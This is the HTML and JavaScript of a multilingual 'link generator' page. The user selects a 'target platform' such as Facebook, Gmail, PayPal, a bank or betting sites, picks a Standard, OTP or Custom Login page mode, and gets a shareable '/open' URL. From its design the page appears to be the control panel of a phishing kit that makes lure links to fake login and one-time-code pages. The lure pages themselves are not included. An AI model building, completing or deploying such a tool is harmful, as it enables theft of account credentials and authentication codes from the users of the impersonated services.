<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title data-i18n="appTitle">Générateur de Liens &amp; Sélecteur de Langue</title>
  <style>
    :root {
      --bg: #0f172a;
      --card: #1e293b;
      --card-2: #0b1220;
      --text: #f8fafc;
      --muted: #94a3b8;
      --accent: #38bdf8;
      --accent-2: #22c55e;
      --border: rgba(148, 163, 184, 0.2);
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    }

    body {
      background: var(--bg);
      color: var(--text);
      min-height: 100vh;
      padding: 20px;
    }

    .container {
      max-width: 780px;
      margin: 0 auto;
      background: var(--card);
      border: 1px solid var(--border);
      border-radius: 16px;
      padding: 24px;
      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.45);
    }

    .top-bar {
      display: flex;
      justify-content: space-between;
      align-items: center;
      flex-wrap: wrap;
      gap: 12px;
      margin-bottom: 20px;
    }

    h1 {
      font-size: 1.35rem;
      font-weight: 700;
    }

    .flag-group {
      display: flex;
      gap: 8px;
      flex-wrap: wrap;
    }

    .flag-btn {
      display: inline-flex;
      align-items: center;
      gap: 6px;
      padding: 7px 12px;
      border-radius: 10px;
      border: 1px solid var(--border);
      background: var(--card-2);
      color: var(--text);
      cursor: pointer;
      font-weight: 600;
      font-size: 0.88rem;
      transition: transform 0.12s ease, border-color 0.15s ease, background 0.15s ease;
    }

    .flag-btn:hover {
      transform: translateY(-1px);
      border-color: var(--accent);
    }

    .flag-btn.active {
      border-color: var(--accent-2);
      background: rgba(34, 197, 94, 0.16);
    }

    .section {
      margin-bottom: 18px;
    }

    label {
      display: block;
      font-size: 0.9rem;
      color: var(--muted);
      margin-bottom: 8px;
      font-weight: 600;
    }

    input[type="text"],
    select {
      width: 100%;
      padding: 12px 14px;
      border-radius: 10px;
      border: 1px solid var(--border);
      background: var(--card-2);
      color: var(--text);
      font-size: 0.95rem;
      outline: none;
    }

    input[type="text"]:focus,
    select:focus {
      border-color: var(--accent);
    }

    .mode-pills {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 10px;
    }

    .mode-btn {
      padding: 11px;
      border-radius: 10px;
      border: 1px solid var(--border);
      background: var(--card-2);
      color: var(--text);
      font-weight: 600;
      cursor: pointer;
      transition: all 0.15s ease;
    }

    .mode-btn.active {
      background: rgba(56, 189, 248, 0.18);
      border-color: var(--accent);
      color: #e0f2fe;
    }

    .status-badge {
      display: inline-block;
      margin-top: 8px;
      font-size: 0.84rem;
      color: var(--accent-2);
    }

    .primary-btn {
      width: 100%;
      padding: 14px;
      border: none;
      border-radius: 12px;
      background: linear-gradient(135deg, #0284c7, #22c55e);
      color: #ffffff;
      font-size: 1rem;
      font-weight: 700;
      cursor: pointer;
      margin-top: 8px;
    }

    .primary-btn:hover {
      opacity: 0.95;
    }

    /* Fenêtre Modale */
    .modal-backdrop {
      position: fixed;
      inset: 0;
      background: rgba(2, 6, 23, 0.78);
      display: none;
      align-items: center;
      justify-content: center;
      padding: 16px;
      z-index: 999;
    }

    .modal-backdrop.open {
      display: flex;
    }

    .modal-box {
      width: 100%;
      max-width: 540px;
      background: var(--card);
      border: 1px solid var(--border);
      border-radius: 16px;
      padding: 22px;
      box-shadow: 0 25px 60px rgba(0, 0, 0, 0.6);
    }

    .modal-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 14px;
    }

    .modal-title {
      font-size: 1.15rem;
      font-weight: 700;
    }

    .close-btn {
      background: transparent;
      border: 1px solid var(--border);
      color: var(--text);
      border-radius: 8px;
      width: 34px;
      height: 34px;
      cursor: pointer;
      font-size: 1.1rem;
    }

    .modal-summary {
      background: var(--card-2);
      border: 1px solid var(--border);
      border-radius: 10px;
      padding: 10px 12px;
      font-size: 0.88rem;
      color: var(--muted);
      margin-bottom: 14px;
    }

    .link-row {
      display: flex;
      gap: 8px;
      margin-top: 10px;
    }

    .copy-btn,
    .open-link-btn {
      padding: 11px 14px;
      border-radius: 10px;
      border: none;
      font-weight: 700;
      cursor: pointer;
      text-decoration: none;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      font-size: 0.9rem;
    }

    .copy-btn {
      background: var(--accent);
      color: #082f49;
      flex: 1;
    }

    .open-link-btn {
      background: var(--accent-2);
      color: #052e16;
      flex: 1;
    }

    .copied-msg {
      margin-top: 8px;
      font-size: 0.84rem;
      color: var(--accent-2);
      min-height: 20px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="top-bar">
      <h1 data-i18n="appTitle">Générateur de Liens &amp; Sélecteur de Langue</h1>

      <!-- Drapeaux globaux de l'interface -->
      <div class="flag-group" id="globalFlags">
        <button type="button" class="flag-btn active" data-lang="fr">🇫🇷 FR</button>
        <button type="button" class="flag-btn" data-lang="en">🇬🇧 EN</button>
        <button type="button" class="flag-btn" data-lang="es">🇪🇸 ES</button>
        <button type="button" class="flag-btn" data-lang="ar">🇸🇦 AR</button>
      </div>
    </div>

    <!-- Collage / Validation automatique -->
    <div class="section">
      <label for="pasteInput" data-i18n="pasteLabel">
        Coller un lien ou un nom de plateforme (validation automatique)
      </label>
      <input
        type="text"
        id="pasteInput"
        placeholder="Ex: https://www.facebook.com/... ou instagram ou tiktok"
        autocomplete="off"
      />
      <div class="status-badge" id="autoDetectStatus"></div>
    </div>

    <!-- Choix de la plateforme -->
    <div class="section">
      <label for="platformSelect" data-i18n="platformLabel">Plateforme cible</label>
      <select id="platformSelect">
        <option value="facebook">Facebook</option>
        <option value="instagram">Instagram</option>
        <option value="tiktok">TikTok</option>
        <option value="whatsapp">WhatsApp</option>
        <option value="telegram">Telegram</option>
        <option value="gmail">Gmail</option>
        <option value="yahoo">Yahoo</option>
        <option value="snapchat">Snapchat</option>
        <option value="linkedin">LinkedIn</option>
        <option value="netflix">Netflix</option>
        <option value="amazon">Amazon</option>
        <option value="paypal">PayPal</option>
        <option value="bank">Bank</option>
        <option value="1xbet">1xBet</option>
        <option value="betclic">Betclic</option>
      </select>
    </div>

    <!-- Choix du mode -->
    <div class="section">
      <label data-i18n="modeLabel">Type de page / mode</label>
      <div class="mode-pills" id="modeGroup">
        <button type="button" class="mode-btn active" data-mode="standard" data-i18n="modeStandard">
          Standard
        </button>
        <button type="button" class="mode-btn" data-mode="otp" data-i18n="modeOtp">
          OTP
        </button>
        <button type="button" class="mode-btn" data-mode="custom" data-i18n="modeCustom">
          Custom Login
        </button>
      </div>
    </div>

    <button type="button" class="primary-btn" id="openModalBtn" data-i18n="generateBtn">
      Générer le lien et choisir la langue
    </button>
  </div>

  <!-- Fenêtre modale avec drapeaux de personnalisation de langue -->
  <div class="modal-backdrop" id="linkModal" aria-hidden="true">
    <div class="modal-box" role="dialog" aria-modal="true">
      <div class="modal-header">
        <div class="modal-title" data-i18n="modalTitle">Lien généré &amp; langue de la page</div>
        <button type="button" class="close-btn" id="closeModalBtn" aria-label="Fermer">&times;</button>
      </div>

      <div class="modal-summary" id="modalSummary"></div>

      <label data-i18n="modalFlagsLabel">
        Cliquez sur un drapeau pour adapter toute l'interface de la page cible :
      </label>
      <div class="flag-group" id="modalFlags" style="margin-bottom: 12px;">
        <button type="button" class="flag-btn active" data-lang="fr">🇫🇷 Français</button>
        <button type="button" class="flag-btn" data-lang="en">🇬🇧 English</button>
        <button type="button" class="flag-btn" data-lang="es">🇪🇸 Español</button>
        <button type="button" class="flag-btn" data-lang="ar">🇸🇦 العربية</button>
      </div>

      <label for="generatedLinkInput" data-i18n="generatedLinkLabel">Lien prêt à copier / exécuter</label>
      <input type="text" id="generatedLinkInput" readonly />

      <div class="link-row">
        <button type="button" class="copy-btn" id="copyLinkBtn" data-i18n="copyBtn">Copier le lien</button>
        <a href="#" target="_blank" rel="noopener noreferrer" class="open-link-btn" id="directOpenBtn" data-i18n="openBtn">
          Ouvrir la page
        </a>
      </div>
      <div class="copied-msg" id="copiedMsg"></div>
    </div>
  </div>

  <script>
    const PLATFORMS = [
      "1xbet", "amazon", "bank", "betclic", "facebook",
      "gmail", "instagram", "linkedin", "netflix", "paypal",
      "snapchat", "telegram", "tiktok", "whatsapp", "yahoo"
    ];

    const I18N = {
      fr: {
        dir: "ltr",
        appTitle: "Générateur de Liens & Sélecteur de Langue",
        pasteLabel: "Coller un lien ou un nom de plateforme (validation automatique)",
        platformLabel: "Plateforme cible",
        modeLabel: "Type de page / mode",
        modeStandard: "Standard",
        modeOtp: "OTP",
        modeCustom: "Custom Login",
        generateBtn: "Générer le lien et choisir la langue",
        modalTitle: "Lien généré & langue de la page",
        modalFlagsLabel: "Cliquez sur un drapeau pour adapter toute l'interface de la page cible :",
        generatedLinkLabel: "Lien prêt à copier / exécuter",
        copyBtn: "Copier le lien",
        openBtn: "Ouvrir la page",
        copied: "Lien copié dans le presse-papiers !",
        detectedPrefix: "Détecté automatiquement :"
      },
      en: {
        dir: "ltr",
        appTitle: "Link Generator & Language Selector",
        pasteLabel: "Paste a link or platform name (auto-validation)",
        platformLabel: "Target platform",
        modeLabel: "Page type / mode",
        modeStandard: "Standard",
        modeOtp: "OTP",
        modeCustom: "Custom Login",
        generateBtn: "Generate link and select language",
        modalTitle: "Generated link & page language",
        modalFlagsLabel: "Click a flag to customize the entire target page interface:",
        generatedLinkLabel: "Link ready to copy / run",
        copyBtn: "Copy link",
        openBtn: "Open page",
        copied: "Link copied to clipboard!",
        detectedPrefix: "Auto-detected:"
      },
      es: {
        dir: "ltr",
        appTitle: "Generador de Enlaces y Selector de Idioma",
        pasteLabel: "Pega un enlace o nombre de plataforma (validación automática)",
        platformLabel: "Plataforma de destino",
        modeLabel: "Tipo de página / modo",
        modeStandard: "Estándar",
        modeOtp: "OTP",
        modeCustom: "Custom Login",
        generateBtn: "Generar enlace y elegir idioma",
        modalTitle: "Enlace generado e idioma de la página",
        modalFlagsLabel: "Haz clic en una bandera para adaptar toda la interfaz de la página:",
        generatedLinkLabel: "Enlace listo para copiar / ejecutar",
        copyBtn: "Copiar enlace",
        openBtn: "Abrir página",
        copied: "¡Enlace copiado al portapapeles!",
        detectedPrefix: "Detectado automáticamente:"
      },
      ar: {
        dir: "rtl",
        appTitle: "مولّد الروابط ومحدّد اللغة",
        pasteLabel: "الصق رابطاً أو اسم منصة (تحقق تلقائي)",
        platformLabel: "المنصة المستهدفة",
        modeLabel: "نوع الصفحة / الوضع",
        modeStandard: "قياسي",
        modeOtp: "OTP",
        modeCustom: "تسجيل مخصص",
        generateBtn: "إنشاء الرابط واختيار اللغة",
        modalTitle: "الرابط المُنشأ ولغة الصفحة",
        modalFlagsLabel: "اضغط على العلم لتخصيص واجهة الصفحة بالكامل:",
        generatedLinkLabel: "الرابط جاهز للنسخ / التشغيل",
        copyBtn: "نسخ الرابط",
        openBtn: "فتح الصفحة",
        copied: "تم نسخ الرابط إلى الحافظة!",
        detectedPrefix: "تم الاكتشاف تلقائياً:"
      }
    };

    const state = {
      platform: "facebook",
      mode: "standard",
      lang: "fr"
    };

    const pasteInput = document.getElementById("pasteInput");
    const platformSelect = document.getElementById("platformSelect");
    const autoDetectStatus = document.getElementById("autoDetectStatus");
    const openModalBtn = document.getElementById("openModalBtn");
    const linkModal = document.getElementById("linkModal");
    const closeModalBtn = document.getElementById("closeModalBtn");
    const generatedLinkInput = document.getElementById("generatedLinkInput");
    const directOpenBtn = document.getElementById("directOpenBtn");
    const modalSummary = document.getElementById("modalSummary");
    const copyLinkBtn = document.getElementById("copyLinkBtn");
    const copiedMsg = document.getElementById("copiedMsg");

    function detectPlatformAndMode(rawText) {
      if (!rawText) return null;
      const text = rawText.trim().toLowerCase();
      let foundPlatform = null;
      let foundMode = null;

      for (const p of PLATFORMS) {
        if (text.includes(p)) {
          foundPlatform = p;
          break;
        }
      }

      if (text.includes("otp") || text.includes("_otp")) {
        foundMode = "otp";
      } else if (text.includes("custom")) {
        foundMode = "custom";
      } else if (foundPlatform) {
        foundMode = "standard";
      }

      return { platform: foundPlatform, mode: foundMode };
    }

    function applyUiLanguage(langCode) {
      const dict = I18N[langCode] || I18N.fr;
      document.documentElement.lang = langCode;
      document.documentElement.dir = dict.dir;

      document.querySelectorAll("[data-i18n]").forEach((el) => {
        const key = el.getAttribute("data-i18n");
        if (dict[key]) {
          el.textContent = dict[key];
        }
      });

      document.querySelectorAll("#globalFlags .flag-btn").forEach((btn) => {
        btn.classList.toggle("active", btn.dataset.lang === langCode);
      });
    }

    function syncFlagButtons(langCode) {
      document.querySelectorAll("#modalFlags .flag-btn").forEach((btn) => {
        btn.classList.toggle("active", btn.dataset.lang === langCode);
      });
    }

    function buildGeneratedUrl() {
      const url = new URL("/open", window.location.origin);
      url.searchParams.set("platform", state.platform);
      url.searchParams.set("mode", state.mode);
      url.searchParams.set("lang", state.lang);
      return url.toString();
    }

    function refreshModalLink() {
      const finalUrl = buildGeneratedUrl();
      generatedLinkInput.value = finalUrl;
      directOpenBtn.href = finalUrl;
      modalSummary.textContent =
        `Plateforme : ${state.platform.toUpperCase()} | Mode : ${state.mode.toUpperCase()} | Langue : ${state.lang.toUpperCase()}`;
      copiedMsg.textContent = "";
      syncFlagButtons(state.lang);
    }

    function handleAutoValidation(sourceText) {
      const result = detectPlatformAndMode(sourceText);
      if (result && result.platform) {
        state.platform = result.platform;
        platformSelect.value = result.platform;

        if (result.mode) {
          state.mode = result.mode;
          document.querySelectorAll("#modeGroup .mode-btn").forEach((btn) => {
            btn.classList.toggle("active", btn.dataset.mode === state.mode);
          });
        }

        const prefix = (I18N[state.lang] || I18N.fr).detectedPrefix;
        autoDetectStatus.textContent = `${prefix} ${state.platform.toUpperCase()} (${state.mode.toUpperCase()})`;
      }
    }

    // Collage et validation automatique
    pasteInput.addEventListener("paste", (e) => {
      const pasted = (e.clipboardData || window.clipboardData).getData("text");
      setTimeout(() => handleAutoValidation(pasted || pasteInput.value), 0);
    });

    pasteInput.addEventListener("input", () => {
      handleAutoValidation(pasteInput.value);
    });

    // Changement manuel de plateforme
    platformSelect.addEventListener("change", () => {
      state.platform = platformSelect.value;
      autoDetectStatus.textContent = `${state.platform.toUpperCase()} (${state.mode.toUpperCase()})`;
      if (linkModal.classList.contains("open")) {
        refreshModalLink();
      }
    });

    // Changement de mode (Standard / OTP / Custom)
    document.querySelectorAll("#modeGroup .mode-btn").forEach((btn) => {
      btn.addEventListener("click", () => {
        state.mode = btn.dataset.mode;
        document.querySelectorAll("#modeGroup .mode-btn").forEach((b) => {
          b.classList.toggle("active", b === btn);
        });
        autoDetectStatus.textContent = `${state.platform.toUpperCase()} (${state.mode.toUpperCase()})`;
        if (linkModal.classList.contains("open")) {
          refreshModalLink();
        }
      });
    });

    // Drapeaux globaux
    document.querySelectorAll("#globalFlags .flag-btn").forEach((btn) => {
      btn.addEventListener("click", () => {
        state.lang = btn.dataset.lang;
        applyUiLanguage(state.lang);
        if (linkModal.classList.contains("open")) {
          refreshModalLink();
        }
      });
    });

    // Drapeaux dans la modale
    document.querySelectorAll("#modalFlags .flag-btn").forEach((btn) => {
      btn.addEventListener("click", () => {
        state.lang = btn.dataset.lang;
        applyUiLanguage(state.lang);
        refreshModalLink();
      });
    });

    // Ouverture / Fermeture modale
    openModalBtn.addEventListener("click", () => {
      state.platform = platformSelect.value;
      refreshModalLink();
      linkModal.classList.add("open");
      linkModal.setAttribute("aria-hidden", "false");
    });

    closeModalBtn.addEventListener("click", () => {
      linkModal.classList.remove("open");
      linkModal.setAttribute("aria-hidden", "true");
    });

    linkModal.addEventListener("click", (e) => {
      if (e.target === linkModal) {
        linkModal.classList.remove("open");
        linkModal.setAttribute("aria-hidden", "true");
      }
    });

    // Copie du lien
    copyLinkBtn.addEventListener("click", async () => {
      const val = generatedLinkInput.value;
      try {
        await navigator.clipboard.writeText(val);
      } catch (_) {
        generatedLinkInput.select();
        document.execCommand("copy");
      }
      copiedMsg.textContent = (I18N[state.lang] || I18N.fr).copied;
    });

    // Initialisation
    applyUiLanguage(state.lang);
  </script>
</body>
</html>
